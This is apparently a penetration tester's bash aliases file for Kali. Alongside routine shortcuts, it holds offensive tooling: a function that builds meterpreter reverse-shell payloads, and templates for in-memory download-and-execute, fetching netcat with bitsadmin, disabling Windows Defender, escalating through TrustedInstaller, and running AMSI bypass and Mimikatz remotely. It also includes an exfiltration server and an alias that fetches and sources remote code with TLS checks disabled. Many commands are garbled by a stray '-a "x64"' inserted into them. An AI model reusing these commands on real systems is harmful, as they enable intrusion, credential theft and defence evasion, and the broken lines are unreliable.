BOLD="\033[01;01m"
YELLOW='\033[0;33m'
NC='\033[0m'

# BASIC OS Commands
alias ll="ls -l"
alias la="ls -la"

alias chmod='chmod -c'
alias rw-='chmod 600'
alias rwx='chmod 700'
alias r--='chmod 644'
alias r-x='chmod 755'

command -v lsd &> /dev/null && alias ls='lsd --group-dirs first -l'
command -v htop &> /dev/null && alias top='htop'

alias mirror='wget -mkEpnp -e robots=off'
alias unblock_dir='sudo chmod -R 755'
alias block_dir='sudo chmod -R 700'

## grep aliases
alias grep="grep --color=always"
alias ngrep="grep -n"
alias egrep="egrep --color=auto"
alias fgrep="fgrep --color=auto"

## screen
alias screen="screen -xRR"

## Checksums
alias sha1="openssl sha1"
alias md5="openssl md5"

## Force create folders
alias mkdir="/bin/mkdir -pv"

## DNS - External IP #1
alias dns1="dig +short @resolver1.opendns.com myip.opendns.com"

## DNS - External IP #2
alias dns2="dig +short @208.67.222.222 myip.opendns.com"

### DNS - Check ("#.abc" is Okay)
alias dns3="dig +short @208.67.220.220 which.opendns.com txt"

## Directory navigation aliases
alias ..="cd .."
alias ...="cd ../.."
alias ....="cd ../../.."
alias .....="cd ../../../.."

## strings
alias strings="strings -a"

## history
alias hg="history | grep"

## aircrack-ng
alias aircrack-ng="aircrack-ng -z"

## airodump-ng 
alias airodump-ng="airodump-ng --manufacturer --wps --uptime"

## rdesktop
alias rdesktop="rdesktop -z -P -g 90% -r disk:local=\"/tmp/\""

## grc diff alias
alias diff='/usr/bin/grc /usr/bin/diff'

## grc dig alias
alias dig='/usr/bin/grc /usr/bin/dig'

## grc gcc alias
alias gcc='/usr/bin/grc /usr/bin/gcc'

## grc ifconfig alias
alias ifconfig='sudo /usr/bin/grc /usr/sbin/ifconfig'

## grc mount alias
alias mount='/usr/bin/grc /usr/bin/mount'

## grc netstat alias
alias netstat='/usr/bin/grc /usr/bin/netstat'

## grc ping alias
alias ping='/usr/bin/grc /usr/bin/ping'

## grc ps alias
alias ps='/usr/bin/grc /usr/bin/ps'

## grc tail alias
alias tail='/usr/bin/grc /usr/bin/tail'

## grc traceroute alias
alias traceroute='/usr/bin/grc /usr/sbin/traceroute'

## grc wdiff alias
alias wdiff='/usr/bin/grc /usr/bin/wdiff'


alias nmap="sudo nmap"

###############
# HELPER
###############
echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - OS HELPER - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

## List open ports
echo "ports - netstats open tcp ports"
alias ports="sudo netstat -tulanp"

## Get external IP address
echo "exip - shows external ip"
alias exip="curl -s http://ipinfo.io/ip"

#copy output to clipboard
echo "pbcopy - used with a pipe, puts stdout of a command to clipboard - cat report.txt | pbcopy"
alias pbcopy='xclip -selection clipboard'
alias pbpaste='xclip -selection clipboard -a "x64" -o'

## Unzip & untar
echo "unzip - uses 7z to unzip a file - unzip <filename.zip>"
alias unzip="7z x "
alias untar="tar -xvf "

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - DOCKER - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

alias dcls="sudo docker container ls -a"
alias dcrm="sudo docker container rm"
alias dils="sudo docker images"
alias dirm="sudo docker image rm"

echo "dockershell - spawns dockershell for a container in it's current working directory - dockershellhere <containername>"
alias dockershell="sudo docker run --rm -i -t --entrypoint=/bin/bash"

echo "dockershellsh - spawns a sh dockershell for a container in it's current working directory dockershellsh <containername>"
alias dockershellsh="sudo docker run --rm -i -t --entrypoint=/bin/sh"

echo "dockershellhere - spawns dockershell for a container and includes the current directory - dockershellhere <containername>"
function dockershellhere() {
    dirname=${PWD##*/}
    sudo docker run --rm -it --entrypoint=/bin/bash -v `pwd`:/${dirname} -w /${dirname} "$@"
}

echo "dockershellshhere - spawns dockershell for a container and includes the current directory - dockershellshhere <containername>"
function dockershellshhere() {
    dirname=${PWD##*/}
    sudo docker run --rm -it --entrypoint=/bin/sh -v `pwd`:/${dirname} -w /${dirname} "$@"
}

echo "autocompose - automatically create a docker compose file from a running container - autocompose <containername>"
alias autocompose='sudo docker run --rm -v /var/run/docker.sock:/var/run/docker.sock ghcr.io/red5d/docker-autocompose'


echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - SERVICES - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"


echo "nginxsslcert - creates a self-signed SSL cert for nginx - nginx has to be restarted to apply changes"
function nginxsslcert() {
        SSL_LOCATION="/opt/ssl"

        echo -n "Coutry [US]: "
        read  CERT_COUNTRY
        [ -z "$CERT_COUNTRY" ] && CERT_COUNTRY="US"

        echo -n "State [WA]: "
        read  CERT_STATE
        [ -z "$CERT_STATE" ] && CERT_STATE="WA"

        echo -n "Location [Seattle]: "
        read  CERT_LOCATION
        [ -z "$CERT_LOCATION" ] && CERT_STATE="WA"

        echo -n "Organization: [Microsoft Corporation]: "
        read CERT_ORGANIZATION
        [ -z "$CERT_ORGANIZATION" ] && CERT_ORGANIZATION="Microsoft Corporation"

        echo -n "Organizational Unit [Microsoft Corporation]: "
        read CERT_OU
        [ -z "$CERT_OU" ] && CERT_OU="Microsoft Corporation"

        echo -n "Common Name (CN) [www.microsoft.com]: "
        read CERT_CN
        [ -z "$CERT_CN" ] && CERT_CN="www.microsoft.com"

         sudo mkdir -pv $SSL_LOCATION
         sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "$SSL_LOCATION/server.key" -a "x64" -out "$SSL_LOCATION/server.crt" -subj "/C=$CERT_COUNTRY/ST=$CERT_STATE/L=$CERT_LOCATION/O=$CERT_ORGANIZATION/OU=$CERT_OU/CN=$CERT_CN"
         echo "\n\nSSL Certificate and Key have been saved to: $SSL_LOCATION"
         echo ""
         echo ""
}


echo "nginxhere - spawns nginx http server in current dir - nginxhere <HTTP-PORT> <HTTPS-PORT>"
function nginxhere() {


        PORT_HTTP=$1
        PORT_HTTPS=$2
        NGINX_CONTAINER_NAME='nginx'
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 2 ];then
                FILE="/opt/ssl/server.crt"
                if test -f "$FILE"; then
                    echo "$FILE Certificate exists ... continuing ..."
                    sudo docker run -d --rm -it -p "$PORT_HTTP:80" -p "$PORT_HTTPS:443" --name "$NGINX_CONTAINER_NAME" -v "/opt/ssl/server.key:/etc/nginx/ssl/server.key" -v "/opt/ssl/server.crt:/etc/nginx/ssl/server.crt" -v "${PWD}:/srv/data" miguel1337/nginxhere:latest    
                else
                    echo "$FILE Certificate does not exist exists ... generating cert ..."
                    nginxsslcert
                    sudo docker run -d --rm -it -p "$PORT_HTTP:80" -p "$PORT_HTTPS:443" --name "$NGINX_CONTAINER_NAME" -v "/opt/ssl/server.key:/etc/nginx/ssl/server.key" -v "/opt/ssl/server.crt:/etc/nginx/ssl/server.crt" -v "${PWD}:/srv/data" miguel1337/nginxhere:latest
                fi
                
                echo "You can access the nginxwebserver via the following url: "
                echo "http://0.0.0.0:$PORT_HTTP"
                echo "https://0.0.0.0:$PORT_HTTPS\n"
                echo "be aware that you can always attach to the container to observe the logs:"
                echo "docker attach $NGINX_CONTAINER_NAME\n"
                echo "If you wish to stop the container run:"
                echo "nginxstop\n"
                echo "If you wish to stop the container run: "
                echo "nginxpurge\n"

        else
                echo -e "${RED}Please enter the HTTP-PORT and HTTPS port as argument: nginxhere 80 443${NC}"
        fi
}

alias nginxstop="sudo docker container stop nginx"
alias nginxpurge="sudo docker container stop nginx && sudo docker image rm miguel1337/nginxhere"

echo "smbservehere - spawns smb server in current dir"
smbservehere() {
    local sharename
    [[ -z $1 ]] && sharename="SHARE" || sharename=$1
    sudo docker run --rm -it -p 445:445 -v "${PWD}:/tmp/serve" rflathers/impacket smbserver.py -smb2support $sharename /tmp/serve
}

echo "webdavhere - spawns webdav server in current dir"
alias webdavhere='sudo docker run --rm -it -p 80:80 -v "${PWD}:/srv/data/share" rflathers/webdav'

echo "reqdump - spawns a simple HTTP Request Dumper. It's s simple JavaScript server that echos any HTTP request it receives it to stdout."
alias reqdump='sudo docker run --rm -it -p 80:3000 rflathers/reqdump'

echo "postfiledumphere - spawns a web server for exifiltration - exifiltration on target via curl --data-binary"
alias postfiledumphere='sudo docker run --rm -it -p80:3000 -v "${PWD}:/data" rflathers/postfiledump'

## ssh-start
echo "ssh-start - start OS SSH service"
alias ssh-start="sudo systemctl restart ssh"
echo "ssh-stop - stop OS SSH service"
alias ssh-stop="sudo systemctl stop ssh"

## samba
echo "smb-start - start OS SSH service"
alias smb-start="sudo systemctl restart smbd nmbd"
echo "smb-stop - stop OS SSH service"
alias smb-stop="sudo systemctl stop smbd nmbd"



echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - INFRA PENTEST - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

echo "nmapfastscan - runs NMAP scanner; fast top1000 TCP; specify <IP's>"
alias nmapfastscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -Pn -n --top-ports 1000 -vvvv --a "x64" -open --max-retries 3 --max-rtt-timeout 900ms --min-hostgroup 254 --min-rate 30000 --defeat-rst-ratelimit --host-timeout 1m "

echo "nmapfulltcpscan - runs NMAP scanner; all TCP ports; specify <IP's>"
alias nmapfulltcpscan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -Pn -p- -vvvv --a "x64" -open --min-rate 20000 --defeat-rst-ratelimit --host-timeout 5m -a "x64" -oA /tmp/nmap_fulltcp --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl "

echo "nmapservicescan - runs NMAP scanner; specific TCP ports; specify <IP's> and -p <PORTS>"
alias nmapservicescan="sudo docker run --rm -it -v "${PWD}:/tmp" instrumentisto/nmap -sS -n -sV -vvvv --a "x64" -open -sC --script-timeout 15m -a "x64" -o -Pn -a "x64" -oA /tmp/nmap_servicescan "

echo "testssl-docker - testssl docker version - testssl-docker"
alias testssl-docker='sudo docker run --rm -ti -v "${PWD}:/data" drwetter/testssl.sh -s -f -p -S -P -h -U --ip one --htmlfile /data/ --logfile /data/ --jsonfile-pretty /data/ --csvfile /data/ --warnings=batch'

echo "cme - CrackMapExec docker edition - cme <args>"
alias cme='sudo docker run --rm -it --entrypoint=/usr/local/bin/cme --name crackmapexec-run -v "${PWD}/CrackMapExec-data:/root/.cme" byt3bl33d3r/crackmapexec'

echo "getports - returns ports of a nmap scan - getports <nmapfile.nmap>"
function getports() {
        # extracts all ports from an nmap scan file as one-line
        # to be used as -sS -Pn -sV -sC -a "x64" -o -p <oneliner>
        nmap_file=$1
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [[ "$nmap_file" == *".nmap"* ]];then
                ports=$(cat $1 | grep " open " | grep -e tcp -e udp | cut -d"/" -f1 | sort | uniq | tr "\n" "," | sed 's/.$//')
                echo $ports && echo
        else
                echo -e "${RED}Only .NMAP format supported! Exiting..${NC}"
        fi
}

echo "startnessus - Starts nessus on TCP/8834 - startnessus <ACTIVATION-CODE>"
function startnessus() {
        USER="nessus"
        ACTIVATION_CODE=$1
        PORT='8834'
        echo -n "Password: "
        read -s PASS
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 1 ];then
                sudo docker run -d --name nessus-docker -p 8834:8834  -e ACTIVATION_CODE="$ACTIVATION_CODE" -e USERNAME="$USER" -e PASSWORD="$PASS" tenableofficial/nessus
                echo "you can access nessus on port via the following url: https://localhost:$PORT"
                echo "Username: $USER"
                echo "Password: $PASS"
        else
                echo -e "${RED}Only please enter a Nessus Activation code as argument ... startnessus <ACTIVATION-CODE>${NC}"
        fi
}

echo "eyewitness - Eyewitness docker edition - eyewitness <args>"
alias eyewitness='sudo docker run --rm -it -v /path/to/results:/tmp/EyeWitness eyewitness'


echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - OSINT - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

echo "sudomy - Subdomain Enumeration & Analysis; sudomy <domain>; runs sudomy docker container with --all flag and no nmap/gobuster; results in 'output' dir"
alias sudomy='cd /opt/tools/osint/sudomy && docker run -v "/opt/tools/osint/sudomy/output:/usr/lib/sudomy/output" -v "/opt/tools/osint/sudomy/sudomy.api:/usr/lib/sudomy/sudomy.api" -it --rm screetsec/sudomy:v1.2.0-dev -a -d'

echo "purednsburte - DNS bruteforce - purednsbrute <wordlist> <domain>"
alias purednsbrute='puredns bruteforce -r /opt/tools/osint/dnsvalidator/resolvers.txt'

echo "dnsvalidator - update dnsvalidators"
alias dnsvalidator="sudo docker run -v /opt/tools/osint/dnsvalidator:/dnsvalidator/output -t dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 20 -a "x64" -o /dnsvalidator/output/resolvers.txt"

echo "xingdumper -u <xing-company-url> - extracts XING employees as CSV"
alias xingdumper="python3 /opt/tools/osint/XingDumper/xingdumper.py"


echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - WEB - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"

echo "shcheck - Security Header Check; shcheck <url> + <args>"
alias shcheck='sudo docker run --rm -it --name shcheck miguel1337/shcheck:latest'

echo "jsEndpoints - find endpoints in JavaScript file - jsEndpoints <url to js>"
function jsEndpoints() {
        URL=$1
        if [ $# -eq 1 ];then
                curl -Lks $URL | tac | sed "s#\\\/#\/#g" | egrep -a "x64" -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=$URL '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
        else
                echo -e "${RED}Please enter an URL as argument ... jsEndpoints <url to js>${NC}"
        fi
   
}
# https://gist.github.com/gwen001/0b15714d964d99c740a7e8998bd483df

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"
echo "msfgenpayloads - Generate different msfpayloads - msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>"
function msfgenpayloads(){


        if [ $# -eq 3 ];then
                INTERFACE=$1
                IPV4="$(ip -a -o -4 addr list $INTERFACE | awk '{print $4}' | cut -d/ -f1)"
                HTTPS_PORT=$2
                TCP_PORT=$3

                echo "Generating meterpreter payloads..."


                echo "\n${YELLOW}${BOLD}Generating meterpreter RAW${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.raw"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f raw -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "raw" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"


                echo "\n${YELLOW}${BOLD}Generating meterpreter C#${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.csharp"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f csharp -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.csharp"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "csharp" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.raw"


                echo "\n${YELLOW}${BOLD}Generating meterpreter Powershell${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f ps1 -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.ps1"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "ps1" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.ps1"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f ps1 -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.ps1"                
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "ps1" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.ps1"

                
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f powershell -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.powershell"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.powershell"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f powershell -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"
                
                echo "\n${YELLOW}${BOLD}Generating meterpreter VBA${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vba"
                echo ""
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "powershell" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.powershell"


                echo "\n${YELLOW}${BOLD}Generating meterpreter vbscript${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$IPV4 LPORT=$HTTPS_PORT EXITFUNC=thread --platform windows -f vbscript -a x64 -o meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vbscript"
                msfvenom -p "windows/x64/meterpreter/reverse_https" LHOST="$IPV4" LPORT="$HTTPS_PORT" EXITFUNC="thread" --platform "windows" -f "vbscript" -a "x64" -o "meterpreter_x64_reverse_https_$IPV4-$HTTPS_PORT.vbscript"
                echo ""
                echo "\n${YELLOW}${BOLD}Generating meterpreter vba${NC}"
                echo "Command: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPV4 LPORT=$TCP_PORT EXITFUNC=thread --platform windows -f vba -a x64 -o meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vbscript"
                msfvenom -p "windows/x64/meterpreter/reverse_tcp" LHOST="$IPV4" LPORT="$TCP_PORT" EXITFUNC="thread" --platform "windows" -f "vba" -a "x64" -o "meterpreter_x64_reverse_tcp_$IPV4-$TCP_PORT.vba"

                echo "\n${YELLOW}${BOLD}Payloads have been generated successfully. Bye${NC}"

        else
                echo -e "${RED}Please the interface and port you want to listen - msfgenpayloads msfgenpayloads <INTERFACE> <HTTPS_PORT> <TCP_PORT>${NC}"
        fi   
}

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - METASPLOIT - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"
echo "iex - command templates for Windows"
function iex(){
        cat << EOF
# Functions of a module
Get-Command -Module nishang

# Help about a function
Get-Help Get-ServiceDetail

# Download
echo "iex((New-a "x64" -object net.webclient).DownloadString(''))" #in memory
echo "(new-a "x64" -object System.Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\<filename>'')" #ondisk


bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe


# Encode/Decode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<cmd>"))
powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ep bypass -enc <base64>

[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<base64>'))

# AV Evasion
Set-MpPreference -DisableRealtimeMonitoring \$true


# Trusted Installer
\$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
\$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument \$cmdline
Register-ScheduledTask -TaskName 'TestTask' -Action \$a
\$svc = New-a "x64" -object -ComObject 'Schedule.Service'
\$svc.Connect()
\$user = 'NT SERVICE\TrustedInstaller'
\$folder = \$svc.GetFolder('\')
\$task = \$folder.GetTask('TestTask')
\$task.RunEx(\$null, 0, 0, \$user)

# PSRemoting
\$SecPassword = ConvertTo-SecureString 'PASSWD' -AsPlainText -Force
\$Cred = New-a "x64" -object System.Management.Automation.PSCredential('DOMAIN\USER', \$SecPassword)
\$s = New-PSSession -ComputerName COMPUTER -Credential \$Cred
Invoke-Command -Session \$s -FilePath C:\AD\Tools\Disable-Amsi.ps1
Invoke-Command –Session \$s -ScriptBlock {Disable-Amsi}
Invoke-Command -Session \$s -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Command –Session \$s -ScriptBlock {Invoke-Mimikatz}

EOF


}

echo -e "${YELLOW}${BOLD}\n========================${NC}"
echo -e "${YELLOW}${BOLD}[ - AD - ]${NC}"
echo -e "${YELLOW}${BOLD}========================${NC}"
echo "docker-bloodhound.py - Collect data for bloodhound - bloodhound.py <args>"
alias docker-bloodhound.py='sudo docker run --rm -ti -v "${PWD}:/bloodhound-data" --entrypoint="/usr/local/bin/bloodhound-python" -it "bloodhound.py"'


echo "neo4jhere - Start neo4j and save data in current directory - neo4jhere <PROJECT_NAME>"
function neo4jhere(){
        NEO4J_USER="neo4j"
        PROJECT_NAME=$1
        echo -n "Password: "
        read -s PASS
        RED='\033[0;31m'
        NC='\033[0m' # No Color
        if [ $# -eq 1 ];then
                sudo docker run -d --name neo4j_$PROJECT_NAME -p 7474:7474 -p 7687:7687 -d -v ${PWD}/neo4j/data:/data -v ${PWD}/neo4j/logs:/logs -v ${PWD}/neo4j/import:/var/lib/neo4j/import -v ${PWD}/neo4j/plugins:/plugins --env NEO4J_AUTH=NEO4J_USER/$PASS neo4j:latest
                echo "you can access neo4j under the following:"
                echo "Address neo4j://localhost:7474"
                echo "Username: $NEO4J_USER"
                echo "Password: $PASS\n"
                echo "The docker container is running under the name neo4j_$PROJECT_NAME"
        else
                echo -e "${RED}Please enter a project name as argument ... neo4jhere <PROJECT_NAME>${NC}"
        fi
}

echo -e "${YELLOW}${BOLD}\n==============================${NC}"
echo -e "${YELLOW}${BOLD}[ - ALIASES - ]${NC}"
echo -e "${YELLOW}${BOLD}==============================${NC}"
echo "updatealiases - update .bash_aliases with newest github version"
alias updatealiases='(curl -k -q -L -f "https://raw.githubusercontent.com/michiiii/KALI_vagrant/master/bash_aliases" > ~/.bash_aliases) && source ~/.bash_aliases && echo "Updated aliases..."'



echo -e "${YELLOW}${BOLD}\n==============================\n${NC}"